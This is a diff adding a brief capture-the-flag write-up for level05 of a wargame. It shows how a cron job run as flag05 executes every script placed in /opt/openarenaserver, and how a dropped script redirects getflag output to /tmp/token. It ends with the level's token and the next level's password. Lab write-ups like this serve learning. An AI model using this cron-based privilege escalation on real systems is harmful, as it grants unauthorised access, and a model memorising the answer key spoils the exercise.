@@ -1,0 +1,42 @@
+Home is empty.
+On loggon, a msg is printed "You have new mail."
+
+		mail
+
+	The program 'mail' is currently not installed.  To run 'mail' please ask your administrator to install the package 'mailutils'
+
+mail is not installed, checking /var/mail/ is a file named level05.
+		
+		cat /var/mail/level05
+
+	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
+
+Seems that there is a cron job which executes the above command at every 2 minutes.
+Let's see what contain the openarenaserver file
+
+		cat /usr/sbin/openarenaserver
+
+	#!/bin/sh
+
+	for i in /opt/openarenaserver/* ; do
+		(ulimit -t 5; bash -x "$i")
+		rm -f "$i"
+	done
+
+We can see a loop which iterate through all the files in opt/openarenaserver/ and evaluate them.
+
+By putting a bash script in that folder we can make redirect getflag into a /tmp/flag file.
+		
+		#!/bin/bash
+		/bin/getflag > /tmp/token
+
+
+Change file modes by setting on execute bits.
+		
+		chmod +x /opt/openarenaserver/hack.sh
+		cat /tmp/token
+	
+	Check flag.Here is your token : viuaaale9huek52boumoomioc
+
+LEVEL06 PASSWORD: viuaaale9huek52boumoomioc
+
